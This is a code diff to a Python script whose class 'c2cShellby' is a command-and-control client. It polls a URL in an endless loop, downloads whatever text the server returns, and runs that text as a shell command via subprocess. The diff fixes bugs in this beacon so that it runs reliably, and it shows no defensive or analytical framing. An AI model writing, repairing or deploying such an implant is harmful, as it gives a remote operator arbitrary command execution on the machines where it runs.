@@ -30,7 +30,7 @@ class c2cShellby:
     def __init__(self, strurlPassed: str="", bolsilentPassed: bool = True, strheaderPassed: str = ""):
         self.strURL = strurlPassed
         self.bolSilent = bolsilentPassed
-        self.strHeader = strcustomPassed
+        self.strHeader = strheaderPassed
 
     def ripURL(self):
             from urllib.parse import urlparse
@@ -41,36 +41,46 @@ class c2cShellby:
             strPort = urlParsed.port
             return strScheme, strPath, strHost, strPort
 
+
     def startC(self):
-        try: 
-            if "" == self.strURL: return False
+        try:
+            if not self.strURL:
+                return False
+            
             strScheme, strPath, strHost, strPort = self.ripURL()
-            if strPort == None: strHostArgs = strHost
-            else: strHostArgs = strHost, strPort
-            if "https" == strScheme: 
-                objConnection = http.client.HTTPSConnection(strHostArgs)
-            elif "http" == strScheme: 
-                objConnection = http.client.HTTPConnection(strHostArgs)
-            else: return False
+            strHostArgs = (strHost, strPort) if strPort else strHost
+
+            if strScheme == "https":
+                objConnection = http.client.HTTPSConnection(*strHostArgs)
+            elif strScheme == "http":
+                objConnection = http.client.HTTPConnection(*strHostArgs)
+            else:
+                return False
+
             objConnection.request("GET", strPath)
             objResponse = objConnection.getresponse()
-            # Check if the request was successful
+
             if objResponse.status == 200:
                 command = objResponse.read().decode().strip()
-                process = subprocess.Popen(command, 
-                                            shell=True, 
-                                            stdout=subprocess.PIPE, 
-                                            stderr=subprocess.PIPE)
+                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout, stderr = process.communicate()
-                if self.bolSilent != True :
-                    print("Output:", stdout.decode())
-                    print("Errors:", stderr.decode())
-            elif bolSilent != True : print("Failed to retrieve the command. Status code:", objResponse.status_code)
+                
+                if not self.bolSilent:
+                    stdout_text = stdout.decode()
+                    stderr_text = stderr.decode()
+                    if stderr_text != stdout_text: 
+                        print("Output:", stdout_text)
+                        print("Errors:", stderr_text)
+            else:
+                if not self.bolSilent:
+                    print("Failed to retrieve the command. Status code:", objResponse.status)
         except Exception as ex:
-            if self.bolSilent != True: print(f"Error encountered:\n{ex}\n")
+            if not self.bolSilent:
+                print(f"Error encountered:\n{ex}\n")
+
 
 
 # Also works with http(s)
 while True: 
-    c2cShellby("http://localhost/index.html", False).startC()
-    time.sleep(20)
+    c2cShellby("http://localhost:2020/index.html", False).startC()
+    time.sleep(5)
